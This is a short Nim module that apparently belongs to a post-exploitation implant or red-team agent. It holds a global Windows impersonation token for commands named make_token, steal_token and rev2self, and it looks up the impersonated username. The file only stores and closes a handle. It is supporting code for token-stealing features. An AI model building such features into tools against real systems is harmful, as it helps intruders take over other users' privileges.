## Token Manager - Stores and manages impersonation tokens
## Used by make_token, steal_token, and rev2self commands

when defined(windows):
  import winim/lean
  import std/widestrs
  
  # Import GetUserNameExW from Secur32.dll
  proc GetUserNameExW(NameFormat: DWORD, lpNameBuffer: LPWSTR, nSize: ptr DWORD): WINBOOL 
    {.importc, dynlib: "secur32.dll", stdcall.}
  
  # Global token handle for impersonation
  var globalTokenHandle*: HANDLE = 0

  proc setTokenHandle*(handle: HANDLE) =
    ## Set the global token handle (closes old one if exists)
    if globalTokenHandle != 0:
      CloseHandle(globalTokenHandle)
    globalTokenHandle = handle

  proc getTokenHandle*(): HANDLE =
    ## Get the current global token handle
    return globalTokenHandle

  proc clearTokenHandle*() =
    ## Clear the global token handle and close it
    if globalTokenHandle != 0:
      CloseHandle(globalTokenHandle)
      globalTokenHandle = 0

  proc getCurrentUsername*(): string =
    ## Get the current username respecting thread impersonation
    ## Uses GetUserNameExW which automatically respects thread tokens
    const NameSamCompatible = 2.DWORD  # EXTENDED_NAME_FORMAT
    
    var nameLen: DWORD = 0
    
    # First call to get the required buffer size
    discard GetUserNameExW(NameSamCompatible, nil, addr nameLen)
    
    if nameLen == 0:
      return ""
    
    # Allocate buffer for the username
    var nameBuffer = newWideCString("", nameLen)
    
    # Get the username
    if GetUserNameExW(NameSamCompatible, cast[LPWSTR](nameBuffer[0].addr), addr nameLen) == 0:
      return ""
    
    # Convert to string
    result = $nameBuffer
else:
  # Unix placeholders (not needed but required for compilation)
  type HANDLE* = int
  
  var globalTokenHandle*: HANDLE = 0
  
  proc setTokenHandle*(handle: HANDLE) = discard
  proc getTokenHandle*(): HANDLE = 0
  proc clearTokenHandle*() = discard
